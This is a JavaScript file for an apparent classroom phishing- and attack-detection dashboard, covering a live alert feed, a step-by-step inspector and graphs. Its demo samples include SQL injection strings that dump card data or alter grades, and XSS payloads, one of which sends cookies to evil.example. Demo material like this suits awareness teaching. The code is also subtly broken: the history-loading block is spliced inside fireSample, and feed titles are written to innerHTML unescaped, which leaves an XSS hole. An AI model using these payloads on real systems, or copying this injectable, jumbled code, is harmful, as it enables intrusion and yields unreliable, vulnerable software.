// CONTRIBUTION: Every dashboard behavior: 17 samples, feed, inspector, graphs.
// ================================================================
// GLOBAL SCRIPT (loaded by base.html on EVERY page) - section map:
// §1  toast + hero clock + stat count-up + employee search filter
// §2  (support/devices pages have their own small scripts inline)
// §3  live WebSocket: LIVE pill + float-ball dot + alert toasts
// §4  dashboard live feed: samples, Simulate button, auto-feed (feed+graphs
//     only, NEVER touches the inspector), feed rows (CLICK -> inspector),
//     attacks/min graph (counts + time), performance graph
// §4f INSPECTOR: 5-step "how it was caught" box + custom attack tester + step-through
// §5  add-person form (dashboard + users pages)
// ================================================================

// ---------- §1a: TOAST - bottom popup used by every feature ----------
function toast(msg) {
  const t = document.getElementById('toast');
  if (!t) return;
  t.textContent = msg;
  t.classList.add('show');
  clearTimeout(window._tt);
  window._tt = setTimeout(() => t.classList.remove('show'), 2600);
}

// ---------- §1b: HERO CLOCK - #clock ticks every second (dashboard) ----------
function tickClock() {
  const el = document.getElementById('clock');
  if (el) el.textContent = new Date().toLocaleTimeString();
}
tickClock(); setInterval(tickClock, 1000);

// ---------- §1c: STAT COUNT-UP - [data-count] numbers animate 0 -> target once ----------
document.querySelectorAll('[data-count]').forEach(el => {
  const target = parseInt(el.dataset.count || '0', 10);
  let v = 0;
  const step = Math.max(1, Math.ceil(target / 24));
  const iv = setInterval(() => {
    v = Math.min(target, v + step);
    el.textContent = v;
    if (v >= target) clearInterval(iv);
  }, 60);
});

// ---------- §1d: SEARCH FILTER - #search hides non-matching #empTable rows (dashboard + users) ----------
const search = document.getElementById('search');
if (search) search.addEventListener('input', () => {
  const q = search.value.toLowerCase();
  document.querySelectorAll('#empTable tbody tr').forEach(tr => {
    tr.style.display = tr.textContent.toLowerCase().includes(q) ? '' : 'none';
  });
});

// ---------- §3: LIVE WEBSOCKET (/ws/alerts) ----------
// drives the topbar LIVE pill (#livePill/#liveText) + float-ball dot (#fbDot):
// green "LIVE" while connected, "reconnecting…" + retry in 2.5s when dropped.
// each incoming alert bumps hero #alertCount and pops a toast.
let alerts = 0;
function connectWS() {
  const pill = document.getElementById('livePill');
  const txt = document.getElementById('liveText');
  const fb = document.getElementById('fbDot');
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  const ws = new WebSocket(proto + '://' + location.host + '/ws/alerts');
  ws.onopen = () => { pill.classList.add('on'); txt.textContent = 'LIVE'; if (fb) fb.classList.add('on'); };
  ws.onmessage = ev => {
    try {
      const m = JSON.parse(ev.data);
      if (m.type === 'hello') { toast('Live feed connected'); return; }
      if (m.type === 'ping') return;
      alerts++;
      const c = document.getElementById('alertCount');
      if (c) c.textContent = alerts;
      toast(m.title || m.msg || 'Live alert');
    } catch (e) { /* ignore */ }
  };
  ws.onclose = () => {
    pill.classList.remove('on'); txt.textContent = 'reconnecting…';
    const fb2 = document.getElementById('fbDot');
    if (fb2) fb2.classList.remove('on');
    setTimeout(connectWS, 2500);
  };
}
connectWS();

// ---------- §4a: THREAT SAMPLES - demo payloads fired by Simulate / auto-feed ----------
// 7-kind taxonomy: phishing | otp | bec | sqli | xss | malware | safe.
// HIGH: score>=0.6 or sqli/xss/malware critical. MEDIUM: mild lures. SAFE: ordinary.
// Simulate cycles all 7 kinds so class sees every detector path.
const SAMPLES = [
  { title: 'Urgent: verify your account now', body: 'Your account will be suspended. Click http://secure-login.example/verify immediately with your password.', kind: 'phishing' },
  { title: 'Invoice #4471 payment due', body: 'Wire the refund to the updated account within 24 hours. Confidential CEO request.', kind: 'bec' },
  { title: 'You won a prize!', body: 'Congratulations, you won a lottery gift. Claim now with your OTP.', kind: 'phishing' },
  { title: 'Gift card for client', body: 'Buy 5 google play cards and send the codes now, urgent client gift.', kind: 'bec' },
  { title: 'WhatsApp OTP check', body: 'Got WhatsApp asking for OTP to verify delivery, share the code?', kind: 'otp' },
  { title: 'QR login verify', body: 'Scan QR code to verify login and enter OTP on the page.', kind: 'otp' },
  { title: 'Ransomware decrypt pay', body: 'Your files encrypted. Pay bitcoin to decrypt. Do not run statement.exe.', kind: 'malware' },
  { title: 'Admission portal login bypass', body: "Username typed admin'-- with any password on the DU admission login, logged in as admin without password", kind: 'sqli' },
  { title: 'Fee receipt data theft', body: "Fee search box typed ' UNION SELECT card_no, cvv FROM payments -- dumped card data on screen", kind: 'sqli' },
  { title: 'Result grade changed', body: "Student ID field typed 101'; UPDATE students SET gpa=4.0 WHERE id=101; -- grades changed", kind: 'sqli' },
  { title: 'Wall post stole session', body: "Wall post contained <script>fetch('http://evil.example?c='+document.cookie)</script> and friends sessions leaked", kind: 'xss' },
  { title: 'Bank feedback keylogger', body: 'Feedback box typed <img src=x onerror=alert(document.domain)> and a fake login popup appeared', kind: 'xss' },
  { title: 'Shop review redirect', body: 'Product review had <a href="javascript:alert(document.cookie)">click for 50% discount</a> stealing cookies', kind: 'xss' },
  { title: 'Customer survey reward', body: 'Congratulations! You have been selected for a customer survey reward - reply with your name to participate.', kind: 'phishing' },
  { title: 'Staff raffle second prize', body: 'You won second prize in the staff raffle - collect it from HR with your ID card this week.', kind: 'otp' },
  { title: 'Free gift for feedback', body: 'Share your course feedback and claim a small gift from the department office this week.', kind: 'phishing' },
  { title: 'Department quiz prize', body: 'Department quiz this Friday. Top scorers get a prize. Register with your name and roll number.', kind: 'phishing' },
  { title: 'Alumni meet lucky draw', body: 'You are invited to the alumni meet lucky draw. Winners get a gift hamper. Reply with your name to join.', kind: 'phishing' },
  { title: 'Mobile recharge bonus', body: 'You have received a mobile recharge bonus. Claim now by replying with your name.', kind: 'otp' },
  { title: 'Team lunch Friday', body: 'Reminder: team lunch at the usual place on Friday afternoon.', kind: 'safe' },
];

// ---------- §4b: fireSample - POSTs one sample to /api/threats, prepends CLICKABLE row ----------
// Manual fires (Simulate button / Test this) also open the inspector.
// Auto-feed fires NEVER touch the inspector (it stays on the picked attack).
async function fireSample(s, auto) {
  const r = await fetch('/api/threats', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ title: s.title, body: s.body, kind: s.kind || 'phishing', employee_id: 'E002' }),
  });
  const d = await r.json();
  d._title = s.title; d._body = s.body; d._kind = s.kind || 'phishing';   // keep original text for inspector step 1
  pushFeed(d.event || { title: s.title, severity: d.severity }, d);
  if (!auto) showInspector(d, true);   // manual fire only: auto-show full trace, no scroll jump
refreshGraph();

// ---------- §4g: LOAD HISTORY - feed starts with last 8 saved threats, not empty ----------
(async function loadFeed() {
  const feed = document.getElementById('feed');
  if (!feed) return;
  try {
    const r = await fetch('/api/threats?limit=8');
    const d = await r.json();
    const items = (d.threats || []).slice().reverse();
    if (!items.length) return;
    feed.innerHTML = '';
    items.forEach(ev => {
      const li = document.createElement('li');
      li.className = 'clickable';
      li.title = 'Click to see how it was caught';
      li.innerHTML = '<span class="feed-dot sev-' + (ev.severity || 'medium') + '"></span> ' +
        ev.title + ' <span class="dim">· ' + (ev.severity || '') + ' · ' + (ev.kind || 'phishing') + '</span>';
      li.addEventListener('click', () => toast('Re-fire Simulate to inspect live trace'));
      feed.prepend(li);
    });
    while (feed.children.length > 8) feed.lastChild.remove();
  } catch (e) { /* ignore */ }
})();
  return d;
}

// ---------- §4c: pushFeed - prepends one CLICKABLE row to #feed (drops placeholder, keeps max 8) ----------
// Click a row -> showInspector(full) for that attack. Full result stored on the element.
function pushFeed(ev, full) {
  const feed = document.getElementById('feed');
  if (!feed) return;
  const dim = feed.querySelector('.dim');
  if (dim) dim.remove();
  const li = document.createElement('li');
  li.className = 'clickable';
  li.title = 'Click to see how it was caught';
  li.innerHTML = '<span class="feed-dot sev-' + (ev.severity || 'medium') + '"></span> ' +
    ev.title + ' <span class="dim">· ' + (ev.severity || '') + ' · ' + ((full && full.kind) || (ev.kind) || 'phishing') + '</span>';
  if (full) li._full = full;
  li.addEventListener('click', () => { if (li._full) showInspector(li._full, true); });
  feed.prepend(li);
  while (feed.children.length > 8) feed.lastChild.remove();
}

// ---------- §4f: INSPECTOR - 5-step "how it was caught" box (#inspector) ----------
// INNOVATIVE VIEW (no more "body 104 chars / score=1.0" plain text):
//   Step 1 = attack card with highlighted danger words + letters/words count
//   Step 2 = animated danger meter (0-100%) + signal chips
//   Step 3 = verdict/severity badges + AI reason quote
// showAll=true renders all 5 at once; false renders first step only (step-through via Next).
let _inspFull = null, _inspShown = 0;
const _esc = (s) => String(s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;');
// highlight danger words inside the attack text with red <mark>
function _highlight(text) {
  const words = ['password', 'otp', 'pin', 'verify', 'suspend', 'locked', 'urgent', 'immediately', 'act now', 'click', 'http', 'login', 'invoice', 'payment', 'wire', 'transfer', 'refund', 'prize', 'lottery', 'winner', 'won', 'ceo', 'confidential', 'gift', 'claim', 'union', 'select', 'drop table', 'insert', 'update', 'delete', '1=1', '--', 'script', 'javascript', 'onerror', 'onload', 'alert', 'cookie', 'img'];
  let out = _esc(text);
  words.forEach(w => {
    try { out = out.replace(new RegExp('(' + w.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'ig'), '<mark>$1</mark>'); } catch (e) { /* skip */ }
  });
  return out;
}
function buildSteps(d) {
  const title = d._title || (d.event && d.event.title) || 'attack';
  const body = d._body || '';
  const score = Number(d.score ?? 0);
  const pct = Math.round(Math.min(1, Math.max(0, score)) * 100);
  const level = score >= 0.6 ? 'high' : score >= 0.3 ? 'medium' : 'low';
  const levelTxt = score >= 0.6 ? 'VERY DANGEROUS' : score >= 0.3 ? 'SUSPICIOUS' : 'LOOKS SAFE';
  const sigs = d.signals || [];
  const words = body.trim() ? body.trim().split(/\s+/).length : 0;
  const p0 = d.pipeline && d.pipeline[3] ? d.pipeline[3].detail : 'saved + live broadcast sent';
  const p4 = d.pipeline && d.pipeline[4] ? d.pipeline[4].detail : ('total ' + (d.total_ms ?? '?') + 'ms');
  return [
    { name: 'Received', ms: 0,
      html: '<div class="kind-chip">' + _esc(d._kind || 'phishing') + '</div><div class="body-box">' + _highlight(title + (body ? '\n' + body : '')) + '</div><div class="meta-line">' + body.length + ' letters · ' + words + ' words · full text shown above</div>' },
    { name: 'Danger meter', ms: d.screen_ms ?? 0,
      html: '<div class="score-wrap"><div class="score-fill lvl-' + level + '" style="width:0%" data-w="' + pct + '%"></div></div><div class="score-line"><b>' + score.toFixed(2) + ' / 1.00</b> — ' + levelTxt + ' (' + pct + '%)</div><div class="chips">' + (sigs.length ? sigs.map(s => '<span class="sig-chip">' + _esc(s) + '</span>').join('') : '<span class="dim">no danger words found</span>') + '</div>' },
    { name: 'AI verdict', ms: d.llm_ms ?? 0,
      html: '<div class="vrow"><span class="vbadge ' + _esc(d.verdict || 'unknown') + '">' + _esc(d.verdict || '?') + '</span><span class="vbadge ' + _esc(d.severity || 'medium') + '">' + _esc(d.severity || '?') + '</span></div><div class="reason">“' + _esc(d.reason || 'no reason') + '”</div>' },
    { name: 'Handling', ms: 0, html: '<span>' + _esc(p0) + '</span>' },
    { name: 'Done', ms: d.total_ms ?? 0, html: '<span>' + _esc(p4) + '</span><div><a class="btn-support" href="/support">See fix in Support</a></div>' },
  ];
}
function renderInspector() {
  const box = document.getElementById('inspSteps');
  const title = document.getElementById('inspTitle');
  if (!box || !_inspFull) return;
  const steps = _inspFull._steps;
  box.innerHTML = '';
  steps.slice(0, _inspShown).forEach((s, i) => {
    const li = document.createElement('li');
    li.className = 'insp-step';
    li.innerHTML = '<b>Step ' + (i + 1) + ' — ' + s.name + ' <em>' + s.ms + 'ms</em></b><div class="step-body">' + s.html + '</div>';
    box.appendChild(li);
  });
  // animate the danger meter 0 -> target AFTER paint (double rAF), so it fills every time
  box.querySelectorAll('.score-fill').forEach(f => {
    requestAnimationFrame(() => requestAnimationFrame(() => { f.style.width = f.dataset.w || '0%'; }));
  });
  if (title) title.textContent = 'Attack: ' + (_inspFull._title || 'sample') + '  →  ' + _inspShown + '/5 steps shown';
}
function showInspector(d, showAll) {
  d._steps = buildSteps(d);
  _inspFull = d;
  _inspShown = showAll ? 5 : 1;
  renderInspector();
  const box = document.getElementById('inspector');
  if (box) box.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
}

// ---------- §4d: GRAPHS - TOP attacks/min (#graph, counts + time labels) + BOTTOM performance (#perfGraph) ----------
async function refreshGraph() {
  try {
    const r = await fetch('/api/stats');
    const d = await r.json();
    drawGraph(d.per_minute || []);
  } catch (e) { /* ignore */ }
  try {
    const r2 = await fetch('/api/perf');
    drawPerf(await r2.json());
  } catch (e) { /* ignore */ }
}

// TOP GRAPH: one bar per minute — number on top = attack count, label below = time (HH:MM)
function drawGraph(points) {
  const cv = document.getElementById('graph');
  if (!cv) return;
  const ctx = cv.getContext('2d');
  const W = cv.width = cv.clientWidth || 600, H = cv.height = 96;
  ctx.clearRect(0, 0, W, H);
  if (!points.length) {
    ctx.fillStyle = '#64748b'; ctx.font = '12px sans-serif'; ctx.textAlign = 'left';
    ctx.fillText('graph wakes up on first threat…', 12, 50);
    return;
  }
  const max = Math.max(1, ...points.map(p => p.n));
  const bw = W / points.length;
  ctx.textAlign = 'center';
  points.forEach((p, i) => {
    const h = (p.n / max) * (H - 44);
    const x = i * bw + bw / 2;
    // bar
    const g = ctx.createLinearGradient(0, H - 18 - h, 0, H - 18);
    g.addColorStop(0, '#22d3ee'); g.addColorStop(1, '#8b5cf6');
    ctx.fillStyle = g;
    ctx.fillRect(i * bw + 3, H - 18 - h, bw - 6, h);
    // attack count on top of bar
    ctx.fillStyle = '#fff'; ctx.font = 'bold 11px sans-serif';
    ctx.fillText(p.n, x, H - 22 - h);
    // time (HH:MM) at bottom — skip every 2nd label when crowded
    if (points.length <= 8 || i % 2 === 0) {
      ctx.fillStyle = '#9aa6c7'; ctx.font = '10px sans-serif';
      ctx.fillText(String(p.minute || '').slice(-5), x, H - 4);
    }
  });
}

// BOTTOM GRAPH: overall performance — 3 bars HIGH/MEDIUM/LOW + grand total caption
function drawPerf(perf) {
  const cv = document.getElementById('perfGraph');
  if (!cv) return;
  const ctx = cv.getContext('2d');
  const W = cv.width = cv.clientWidth || 600, H = cv.height = 96;
  ctx.clearRect(0, 0, W, H);
  const sev = (perf && perf.by_severity) || {};
  const bars = [
    { k: 'high', c: '#fb7185' }, { k: 'medium', c: '#fbbf24' }, { k: 'low', c: '#a3e635' },
  ];
  const vals = bars.map(b => sev[b.k] || 0);
  const max = Math.max(1, ...vals);
  const bw = W / bars.length;
  ctx.textAlign = 'center';
  bars.forEach((b, i) => {
    const h = (vals[i] / max) * (H - 52);
    const x = i * bw + bw / 2;
    ctx.fillStyle = b.c;
    ctx.fillRect(x - 26, H - 24 - h, 52, Math.max(h, 2));
    // count on top, severity name below
    ctx.fillStyle = '#fff'; ctx.font = 'bold 13px sans-serif';
    ctx.fillText(vals[i], x, H - 28 - h);
    ctx.fillStyle = '#9aa6c7'; ctx.font = '11px sans-serif';
    ctx.fillText(b.k.toUpperCase(), x, H - 8);
  });
  const t = document.getElementById('perfTotal');
  if (t) t.textContent = 'Total detections: ' + ((perf && perf.total) || 0);
}

// ---------- §4e: SIMULATE BUTTON + CUSTOM TESTER + AUTO-FEED (dashboard live card) ----------
// Simulate fires ONE random attack per click (phishing/sqli/xss/medium/safe cycle).
const btnSim = document.getElementById('btnSim');
if (btnSim) btnSim.addEventListener('click', async () => {
  btnSim.disabled = true;
  const s = SAMPLES[Math.floor(Math.random() * SAMPLES.length)];
  const d = await fireSample(s);
  toast('Verdict: ' + (d.verdict || '?') + ' (' + (d.severity || '?') + ')');
  btnSim.disabled = false;
});

// CUSTOM TESTER: user types own title+body -> fires it like a sample (uses Team lunch defaults if empty)
const btnCustom = document.getElementById('btnCustom');
if (btnCustom) btnCustom.addEventListener('click', async () => {
  const t = (document.getElementById('customTitle').value || '').trim() || 'Team lunch Friday';
  const b = (document.getElementById('customBody').value || '').trim() || 'Reminder: team lunch at the usual place.';
  btnCustom.disabled = true;
  const d = await fireSample({ title: t, body: b });
  toast('Verdict: ' + (d.verdict || '?') + ' (' + (d.severity || '?') + ')');
  btnCustom.disabled = false;
});

// INSPECTOR CONTROLS: Next reveals one more step (class walk-through), Show all reveals 5/5
const btnNext = document.getElementById('btnNext');
if (btnNext) btnNext.addEventListener('click', () => {
  if (!_inspFull) { toast('Fire an attack first'); return; }
  _inspShown = (_inspShown >= 5) ? 1 : _inspShown + 1;   // at full -> restart walk-through from step 1
  renderInspector();
});
const btnAll = document.getElementById('btnAll');
if (btnAll) btnAll.addEventListener('click', () => {
  if (!_inspFull) { toast('Fire an attack first'); return; }
  _inspShown = 5;
  renderInspector();
});

setInterval(async () => {
  const box = document.getElementById('autoFeed');
  if (box && box.checked) {
    const s = SAMPLES[Math.floor(Math.random() * SAMPLES.length)];
    await fireSample(s, true);   // auto=true: feed + graphs only, inspector untouched
  }
}, 10000);

refreshGraph();

// ---------- §5: ADD-PERSON FORM (dashboard + users) ----------
// submits #addPerson to POST /api/employees, prepends the new row to #empTable
// (clearing #search first so the row is never hidden), scrolls to it.
const addForm = document.getElementById('addPerson');
if (addForm) addForm.addEventListener('submit', async (ev) => {
  ev.preventDefault();
  const nameEl = document.getElementById('pName');
  const deptEl = document.getElementById('pDept');
  const pidEl = document.getElementById('pId');
  const riskEl = document.getElementById('pRisk');
  const name = nameEl.value.trim();
  const dept = deptEl.value.trim();
  const pid = pidEl.value.trim();
  const risk = riskEl.value;
  if (!name) { toast('Name required'); return; }
  try {
    const r = await fetch('/api/employees', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name, dept, id: pid, risk }),
    });
    const d = await r.json();
    if (!r.ok || !d.employee) { toast(d.error || 'Add failed'); return; }
    const e = d.employee;
    // clear search so new row is never hidden by filter
    const searchBox = document.getElementById('search');
    if (searchBox) searchBox.value = '';
    const tb = document.querySelector('#empTable tbody');
    // unhide all rows (in case filter was active)
    tb.querySelectorAll('tr').forEach(tr => { tr.style.display = ''; });
    const tr = document.createElement('tr');
    tr.dataset.risk = e.risk;
    const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;');
    tr.innerHTML = '<td>' + esc(e.id) + '</td><td>' + esc(e.name) + '</td><td>' + esc(e.dept || '') +
      '</td><td><span class="badge ' + esc(e.risk) + '">' + esc(e.risk) + '</span></td>';
    tb.prepend(tr);
    tr.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
    addForm.reset();
    toast('Added ' + e.name + ' (' + e.id + ') for analysis');
  } catch (err) { toast('Add failed'); }
});
